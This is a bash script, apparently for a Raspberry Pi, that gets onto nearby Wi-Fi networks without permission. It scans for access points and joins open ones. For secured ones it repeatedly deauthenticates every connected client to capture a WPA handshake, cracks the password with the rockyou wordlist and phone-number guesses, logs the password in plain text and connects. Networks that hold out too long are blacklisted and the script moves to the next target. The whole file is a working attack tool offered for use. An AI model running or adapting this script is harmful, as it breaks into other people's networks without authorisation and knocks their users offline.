#!/bin/bash


touch caplog.txt
touch blacklist
rm crackedpassword    #Deletes the file so it doesn't get confused between attempts
echo $(date) " - Starting script" > caplog.txt
echo $(date) " - Backing up files" >> caplog.txt
#This is to backup files before moving on
mv caplogOLD.txt caplogOLDEST.txt
mv caplog.txt caplogOLD.txt
mv ap/* apBK/
rm -r ap              #Make sure the file is deleted at the start of the script
#The code below tests the connection initially
echo $(date) " - Attempting initial network test..." >> caplog.txt
ping -c 5 www.google.com          #Tests connection, requiring DNS
if [[ $(echo $?) == 2 ]]; then
  echo $(date) " - Failed connection to Google.com." >> caplog.txt
  ping -c 5 8.8.8.8               #Tests connection, not requiring DNS
  if [[ $(echo $?) == 2 ]]; then
    echo $(date) " - Failed connection to 8.8.8.8. Moving on to cracking." >> caplog.txt
  fi
fi
if [[ $(echo $?) == 0 ]]; then
  echo $(date) " - Connection appears to be working. No need for cracking." >> caplog.txt
  python sendsuccess.py
  exit 1                #Since it has a connection, no need to break any passwords, exits the script
fi
#Start the cracking script...
if [[ $(grep wlan1 /proc/net/dev) != '' ]]; then
    echo $(date) " - Starting monitoring..." >> caplog.txt
    ifconfig wlan1 down
    iwconfig wlan1 mode monitor
    ifconfig wlan1 up
    echo $(date) " - Starting scan..." >> caplog.txt
    mkdir ap/
    airodump-ng -w ap/automated --beacons --ignore-negative-one wlan1 & #Start the scan in the background and let it collect data
    sleep 60
    pid="$(ps -e | grep airodump-ng | cut -d' ' -f1 | sed -n '1p')"      #This gets the process ID to kill
    if [[ $pid == '' ]]; then
      pid="$(ps -e | grep airodump-ng | cut -d' ' -f2 | sed -n '1p')"      #This gets the process ID to kill
    fi
    echo $(date) " - Killing $pid" >> caplog.txt
    kill $pid                                   #Kills the process
    sed -i '1d;2d' ap/automated-01.csv                      #Deletes the top blank line and column headers
    sed -ie '/Station MAC/,+50d' ap/automated-01.csv        #Takes away the garbage at the bottom of the file
    lines="$(wc -l ap/automated-01.csv | cut -d' '  -f1)" #This figures out how many lines are left so it can choose near the bottom
    if [[ $lines -gt '3' ]]; then              #Only lop off the last two lines if its at least 5 lines long
      lines="$(($lines-2))"                   #Used to select the line 2nd from the bottom
    else
      lines="$(($lines-1))"
    fi
    # Check if there is an open network
    if [[ $(grep -n 'OPN' ap/automated-01.csv | cut -d':' -f1) != '' ]]; then      #Looks for an open network, if it exists, it tries to connect
      linenum="$(grep -n 'OPN' ap/automated-01.csv | cut -d':' -f1)"        #Finds the line number
      ssid="$(cut -d',' -f14 ap/automated-01.csv | sed -n $(echo $linenum)p)" #Grabs the SSID for the connect command
      if [[ $ssid != '' ]] && [[ $ssid != ' ' ]]; then
        echo $(date) " - Found an open network. Trying to connect to $ssid" >> caplog.txt
        ifconfig wlan1 down               #Take it out of monitoring mode
        iwconfig wlan1 mode managed
        ifconfig wlan1 up
        iw dev wlan1 connect '$((ssid))'                                     #Attempts to connect
        sleep 60
        ping -c 5 www.google.com          #Tests connection, requiring DNS
        if [[ $(echo $?) == 2 ]]; then
          echo $(date) " - Failed connection to Google.com" >> caplog.txt
          ping -c 5 8.8.8.8               #Tests connection, not requiring DNS
          if [[ $(echo $?) == 2 ]]; then
            echo $(date) " - Failed connection to 8.8.8.8! No network connection, moving on to break password." >> caplog.txt
            ifconfig wlan1 down             #Put it back into monitoring mode
            iwconfig wlan1 mode monitor
            ifconfig wlan1 up
          fi
        fi
        if [[ $(echo $?) == 0 ]]; then
          echo $(date) " - Connection appears to be working. Exiting." >> caplog.txt
          python sendsuccess.py
          exit 1                #Since it has a connection, no need to break any passwords, exits the script
        fi
      fi
    fi
    #If it must crack the password:
    lines="$(wc -l ap/automated-01.csv | cut -d' '  -f1)" #This figures out how many lines are left so it can choose near the bottom
    if [[ $lines -gt '2' ]]; then              #Only lop off the last two lines if its at least 2 lines long
      lines="$(($lines-1))"                   #Used to select the line 2nd from the bottom
    fi
    ssid=$(cut -d',' -f14 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the SSID 2nd from the bottom
    bssid=$(cut -d',' -f1 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the BSSID 2nd from the bottom
    chan=$(cut -d',' -f4 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")      #Finds the CHANNEL 2nd from the bottom
    if [[ $chan == '-1' ]]; then                        #If it accidently selected its own signal
      echo "Reseting variables"
      lines="$(($lines-1))"
      ssid=$(cut -d',' -f14 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the SSID 2nd from the bottom
      bssid=$(cut -d',' -f1 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the BSSID 2nd from the bottom
      chan=$(cut -d',' -f4 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")      #Finds the CHANNEL 2nd from the bottom
    fi
    while [[ $(echo $ssid) == '' ]] && [[ $(echo $lines) -gt 1 ]] || [[ $(grep $ssid wifiblacklist) != '' ]]; do  #If the SSID is blank AND its not at the top line OR if it's on the blacklist
      lines="$(($lines-1))"
      ssid=$(cut -d',' -f14 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the SSID
      bssid=$(cut -d',' -f1 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the BSSID
      chan=$(cut -d',' -f4 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")      #Finds the CHANNEL
      echo $(date) " - Hotspot was blank or on the blacklist, switching now..." >> caplog.txt
    done
    # lines=$(grep -n 'Test' ap/automated-01.csv | cut -d':'  -f1)                             #DEBUGGING
    # ssid=$(cut -d',' -f14 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #DEBUGGING
    # bssid=$(cut -d',' -f1 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #DEBUGGING
    # chan=$(cut -d',' -f4 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")      #DEBUGGING
    echo $(date) " - Cracking: $ssid BSSID: $bssid Channel: $chan From line: $lines" >> caplog.txt
    echo "-- Progress: 1 --"
    airodump-ng --bssid $bssid --channel $chan --update 10 --write ap/capture wlan1 |& tee airodump-results.txt &     #Attempts to get the password, background process
    #Setup do/while statement to check for handshake
    #Make sure this runs DURING the command, not affter.
    duration=0              #Keeps track of how long its been waiting for a handshake
    rand=$(( ( RANDOM % 20 )  + 50 ))         #Random number between 50 and 70
    # rand=4                                      #DEBUGGING
    waited=0
    echo $(date) " - Waiting for handshake. Current random wait time is: $(($rand/4)) minutes" >> caplog.txt
    while [[ $(grep handshake airodump-results.txt) == '' ]]; do        #While there is no capture file...
      duration="$(($duration+1))"             #Add one to the duration
      if [[ $duration -lt $rand ]]; then       #If its waited less than 15 minutes...
        echo "Waiting"
        sleep 15
      else                        #If its waited more than 15 minutes
        echo "De-authing"
        duration=0
        waited="$(($waited+$rand))"                   #Shows how long its waited
        if [[ $waited > 60 ]]; then                    #If its been over an hour of waiting (probably an inactive hotspot)
          echo $(date) " - I've waited $(($waited/4)) minutes. Now BLACKLISTING the wifi and restarting the script" >> caplog.txt
          echo $(date) " - BLACKLISTING: $ssid" >> caplog.txt
          echo $ssid >> wifiblacklist             #Writes the SSID to the blacklist file for records
          exec bash capture2                      #Restarts the script, but it will skip the hotspot it just tried
        fi
        rand=$(( ( RANDOM % 20 )  + 50 ))         #Random number between 50 and 70
        echo $(date) " - De-authing clients. New wait time is: $(($rand/4)) minutes. I've waited a total of $(($waited/4)) minutes." >> caplog.txt
        echo '' > airodump-results.txt        #Clears the file so it doesn't get to huge
        aireplay-ng -0 2 -a $bssid wlan1       #De-auths every client
        sleep 15
      fi
    done
    echo $(date) " - HANDSHAKE CAPTURED" >> caplog.txt
    pid="$(ps -e | grep airodump-ng | cut -d' ' -f1 | sed -n '1p')"      #This gets the process ID to kill
    echo $(date) " - Killing $pid since I have a handshake file" >> caplog.txt                #Logs the kill
    kill $pid                                     #Kills the airodump-ng process since it has a handshake by now
    if [[ $(ls /usr/share/wordlists/rockyou.txt) == '' ]]; then    #If rockyou.txt isn't unzipped, it will do that here
      echo $(date) " - Rockyou isn't unzipped. Uncompressing now." >> caplog.txt
      gunzip /usr/share/wordlists/rockyou*
    fi
    #Turn off monitoring mode to allow more CPU usage for cracking
    echo $(date) " - Got the handshake. Turning off monitoring mode" >> caplog.txt
    ifconfig wlan1 down
    iwconfig wlan1 mode managed
    ifconfig wlan1 up
    #It will attempt to break the password now. With the Pi, this can take up to 36 hours
    #It'll use the rockyou.txt file and write the password out to "crackedpassword" when its done
    echo "-- Progress: 2 --"
    aircrack-ng -b $bssid -l crackedpassword ap/capture-??.cap -w /root/Documents/dictionaries/rockyou.txt    #Tries to crack it with the dictionary
    # aircrack-ng -b $bssid -l crackedpassword ap/capture-??.cap -w /usr/share/wordlists/test.txt    #DEBUGGING
    if [[ $(cat crackedpassword) != '' ]]; then
      echo $(date) " - The password was cracked.       Password: $(cat crackedpassword)" >> caplog.txt
      nmcli d wifi connect $ssid password $(cat crackedpassword)
      sleep 60
      ping -c 5 www.google.com          #Tests connection, requiring DNS
      if [[ $(echo $?) == 2 ]]; then
        echo $(date) " - Failed connection to Google.com" >> caplog.txt
        ping -c 5 8.8.8.8               #Tests connection, not requiring DNS
        if [[ $(echo $?) == 2 ]]; then
          echo $(date) " - Failed connection to 8.8.8.8! No network connection, moving on to dictionary attack." >> caplog.txt
        fi
      fi
      if [[ $(echo $?) == 0 ]]; then
        echo $(date) " - Connection appears to be working. Exiting." >> caplog.txt
        python sendsuccess.py
        exit 1                #Since it has a connection, no need to break any passwords, exits the script
      fi
    fi
    areacode=208            #Change this to the state area code
    crunch 10 10 -t $areacode%%%%%%% | aircrack-ng -b $bssid -l crackedpassword ap/capture-??.cap -w -      #Tries to crack it with a phone number
    if [[ $(cat crackedpassword) == '' ]]; then
      echo $(date) " - NO PASSWORD FOUND! --- Quitting ---"
      echo $(date) " - Turning off monitoring mode" >> caplog.txt
      ifconfig wlan1 down
      iwconfig wlan1 mode managed
      ifconfig wlan1 up
      exit 1
    fi
    if [[ $(cat crackedpassword) != '' ]]; then
      echo $(date) " - The password was cracked.       Password: $(cat crackedpassword)" >> caplog.txt
      nmcli d wifi connect "$(echo $ssid)" password $(cat crackedpassword)
      sleep 60
      ping -c 5 www.google.com          #Tests connection, requiring DNS
      if [[ $(echo $?) == 2 ]]; then
        echo $(date) " - Failed connection to Google.com" >> caplog.txt
        ping -c 5 8.8.8.8               #Tests connection, not requiring DNS
        if [[ $(echo $?) == 2 ]]; then
          echo $(date) " - Failed connection to 8.8.8.8! No network connection, something went wrong." >> caplog.txt
          exit 1
        fi
      fi
      if [[ $(echo $?) == 0 ]]; then
        echo $(date) " - Connection appears to be working. Exiting." >> caplog.txt
        python sendsuccess.py
        exit 1                #Since it has a connection, no need to break any passwords, exits the script
      fi
    fi
fi
if [[ $(grep wlan1 /proc/net/dev) == '' ]]; then
    echo $(date) " - There is no wlan1 to use" >> caplog.txt
    sleep 3
fi
#Catch-all to turn off monitoring mode if its still on
echo $(date) " - Turning off monitoring mode" >> caplog.txt
ifconfig wlan1 down
iwconfig wlan1 mode managed
ifconfig wlan1 up
echo $(date) " - FINAL EXIT" >> caplog.txt
exit 1
